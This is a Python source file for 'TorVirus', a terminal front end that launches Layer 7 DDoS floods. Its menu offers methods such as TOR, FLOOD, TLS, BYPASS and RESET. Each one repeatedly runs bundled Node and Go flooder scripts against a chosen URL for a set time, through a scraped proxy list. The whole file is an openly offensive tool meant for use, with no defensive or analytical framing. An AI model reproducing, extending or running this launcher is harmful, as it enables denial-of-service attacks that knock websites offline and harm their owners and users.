import os as o
import time as t
import sys as s
import random as r


def progress(current, total, bar_len=30):
    fil_len = int(bar_len * current // total)
    bar = "█" * fil_len + "-" * (bar_len - fil_len)
    return f"[{bar}] {current}/{total}"


def clr_csl():
    o.system("cls" if o.name == "nt" else "clear")


def load_prxs(file_path="bin/odd/.cache/proxy.txt"):
    try:
        with open(file_path, "r") as file:
            for line in file:
                proxy = line.strip()
                if proxy:
                    yield proxy
    except FileNotFoundError:
        print(f"⚠️  Error: {file_path} not found. Proxy connection aborted.")
        s.exit(1)


def dis_dash():
    uptime_seconds = int(t.time() - ses_srt)
    minutes, seconds = divmod(uptime_seconds, 60)
    print(
        f"""
    🖥️  TorVirus DASHBOARD 🖥️
    | 🛰️  Bots Online: {bot_cnt}
    | ⏳ Uptime: {minutes}m {seconds}s
    | 📈 Success Rate: {r.randint(85, 99)}%
    | 🔗 Network Strength: {r.choice(["Strong", "Moderate", "Weak"])}
    | ⚠️  Threat Level: {r.choice(["🟢 Low", "🟡 Medium", "🔴 High"])}
    """
    )


def mat_eff(duration=3):
    start = t.time()
    while t.time() - start < duration:
        print("".join(r.choice("01 ") for _ in range(80)))
        t.sleep(0.1)


def wlc_msg(bot_cnt, session_time):
    title = "           🚨 WELCOME TO TORVIRUS 🚨"
    info = f"| 🔐 Zombies: {bot_cnt} | Session: {session_time:.2f}s | Tor ✅|"
    clr_csl()
    mat_eff(2)
    clr_csl()
    print(f"{title}\n{info}\n")


def dis_menu():
    clr_csl()
    wlc_msg(bot_cnt, ses_dur())
    print(
        """
  _____      __   ___
 |_   _|__ _ \\ \\ / (_)_ _ _  _ ___
   | |/ _ \\ '_\\ V /| | '_| || (_-<
   |_|\\___/_|  \\_/ |_|_|  \\_,_/__/

    🚨  LAYER7 ATTACK METHODS MENU  🚨
         (Top-secret Protocols)

    !TOR     - Launch TOR-based DDoS
      Usage: TOR https://example.com 60
"""
    )


def load_ani(task, duration=1.5):
    frames = ["◐", "◓", "◑", "◒"]
    start = t.time()
    index = 0
    while t.time() - start < duration:
        print(f"\r{task} {frames[index % len(frames)]}", end="", flush=True)
        t.sleep(0.15)
        index += 1
    print("\r", end="")


def ani_txt(text, delay=0.05, end_line=True):
    for char in text:
        s.stdout.write(char)
        s.stdout.flush()
        t.sleep(delay)
    if end_line:
        print()


def ran_txt():
    msg_file_path = "lib/msg.txt"
    if o.path.isfile(msg_file_path):
        with open(msg_file_path, "r") as file:
            msg = [line.strip() for line in file if line.strip()]
    else:
        return
    slt_txt = r.choice(msg)
    load_ani("Processing", 1.5)
    ani_txt(slt_txt)


def ses_dur():
    return t.time() - ses_srt


def main_loop():
    dis_menu()
    while True:
        user_input = input("root@torvirus#~ ").strip()
        if not user_input:
            continue
        parts = user_input.split()
        command = parts[0].upper()

        if command == "STATS":
            clr_csl()
            dis_dash()
            continue

        elif command == "LAYER7":
            load_ani("✨ Loading Layer 7 Methods ✨", 1.5)
            print(
                """TOR: TOR https://example.com 60
                     FLOOD: FLOOD https://example.com 60
                     HTTPX: HTTPX https://example.com 60
                     HTTPS: HTTPS https://example.com 60
                     RESET: RESET https://example.com 60"""
            )
            continue

        elif command in ["CLEAR", "CLS"]:
            load_ani("Purging Console", 1.5)
            dis_menu()
            continue

        elif command == "EXIT":
            load_ani("Exiting TorVirus", 1.5)
            ani_txt("👋 Goodbye, have a great day.", 0.02)
            t.sleep(1)
            s.exit(0)

        elif command == "TOR":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f'node bin/odd/.cache/TorXTor.js GET "{host}" {max_time} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                    )
                    o.system(
                        f'node bin/odd/.cache/TorXTor.js POST "{host}" {max_time} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "FLOOD":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"go run bin/odd/.cache/TorXHulk.go --site {host} --data GET"
                    )
                    o.system(
                        f"go run bin/odd/.cache/TorXCrash.go {host} 9999 get {max_time} nil"
                    )
                    o.system(
                        f"go run bin/odd/.cache/TorXHulk.go --site {host} --data POST"
                    )
                    o.system(
                        f"go run bin/odd/.cache/TorXCrash.go {host} 9999 POST {max_time} nil"
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "TLS":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"node bin/odd/.cache/TorXTls.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt"
                    )
                    o.system(
                        f"node bin/odd/.cache/TorXDark.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt"
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "TLS":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"node bin/odd/.cache/TorXTls.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt"
                    )
                    o.system(
                        f"node bin/odd/.cache/TorXDark.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt"
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "NOX":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"node bin/odd/.cache/NOX.js {host} {max_time} 20 90 bin/odd/.cache/proxy.txt"
                    )
                    o.system(
                        f"node bin/odd/.cache/NOX.js {host} {max_time} 20 90 bin/odd/.cache/proxy.txt"
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "HTTPS":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"node bin/odd/.cache/HTTPS.js POST {host} {max_time} 8 8 bin/odd/.cache/proxy.txt"
                    )
                    o.system(
                        f"node bin/odd/.cache/HTPPSV2.js GET {host} {max_time} 8 8 bin/odd/.cache/proxy.txt"
                    )

                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "BYPASS":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"node bin/odd/.cache/TorXBypassV2.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt"
                    )
                    o.system(
                        f"node bin/odd/.cache/TorXBypass.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt"
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: BYPASS https://example.com 60")

        elif command == "RESET":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"node bin/odd/.cache/RESETV2.js {host} {max_time} 8 8 bin/odd/.cache/proxy.txt --full"
                    )
                    o.system(
                        f"node bin/odd/.cache/RESET.js {host} {max_time} 8 8 bin/odd/.cache/proxy.txt"
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "PROXY":
            o.system("python3 bin/odd/.cache/scrape.py &")
            continue

        elif command == "UPDATE":
          o.system("git reset --hard HEAD && git pull origin main")
          continue

        elif command == "SETUP":
            o.system("sudo bash setup.sh &")
            continue

        elif command == "HELP":
            load_ani("Loading Help Interface", 1.5)
            print(
                """
HELP - For Assistance
CLEAR - Clear Terminal
"""
            )

        else:
            print(f"❌ Command [ {command} ] not recognized. Please try again! 🚨")


def con_net():
    ani_txt("🔌 Connecting to the TorVirus Network...", 0.02)
    ran_txt()


ses_srt = t.time()
prxs = list(load_prxs())
bot_cnt = len(prxs)

clr_csl()
con_net()
try:
    main_loop()
finally:
    pass
